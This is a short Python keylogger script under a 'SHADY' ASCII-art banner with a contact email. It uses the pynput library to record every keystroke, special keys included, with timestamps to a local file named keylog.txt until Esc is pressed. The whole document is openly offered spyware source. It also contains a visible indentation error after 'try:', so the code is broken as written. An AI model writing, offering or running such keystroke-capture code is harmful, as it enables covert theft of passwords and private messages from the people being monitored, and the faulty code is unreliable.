
print(
"""
 .oooooo..o ooooo   ooooo   LOVE   .o.   YOU    oooooooooo.   oooooo   oooo 
d8P'    `Y8 `888'   `888'   3000  .888.   :)    `888'   `Y8b   `888.   .8'  
Y88bo.       888     888         .8"888.         888      888   `888. .8'   
 `"Y8888o.   888ooooo888        .8' `888.        888      888    `888.8'    
     `"Y88b  888     888       .88ooo8888.       888      888     `888'     
oo     .d8P  888     888      .8'     `888.      888     d88'      888      
8""88888P'  o888o   o888o    o88o     o8888o    o888bood8P'       o888o     
                                                 ping me --gsaran1209@gmail.com   
""")

import time
import logging
from pynput import keyboard

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        print("Love You 3000")
        time.sleep(1) # wait for 1 second
        print("SHADY")
        time.sleep(1) # wait for 1 second
        # Stop listener
        return False

# Collect events until released
try:
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
except KeyboardInterrupt:
    print("Love You 3000")
    time.sleep(1) # wait for 1 second
    print("SHADY")
    time.sleep(1) # wait for 1 second
